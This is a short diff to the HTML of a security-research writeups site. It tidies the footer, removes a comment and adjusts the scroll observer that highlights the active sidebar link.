+      </div>
+    </section>
 
   </main>
 </div>
 
-<footer>
-  OJM.SEC · Oriol Jaen Mirabet · Security Research &amp; Writeups
-</footer>
+<footer>OJM.SEC · Oriol Jaen Mirabet · Security Research &amp; Writeups</footer>
 
 <script>
-// Active sidebar link on scroll
 const sections = document.querySelectorAll('.section');
 const links = document.querySelectorAll('.sidebar-link');
 const observer = new IntersectionObserver(entries => {
@@ -579,9 +637,8 @@ const observer = new IntersectionObserver(entries => {
       if (active) active.classList.add('active');
     }
   });
-}, { rootMargin: '-30% 0px -60% 0px' });
+}, { rootMargin: '-20% 0px -70% 0px' });
 sections.forEach(s => observer.observe(s));
 </script>
-
 </body>
 </html>
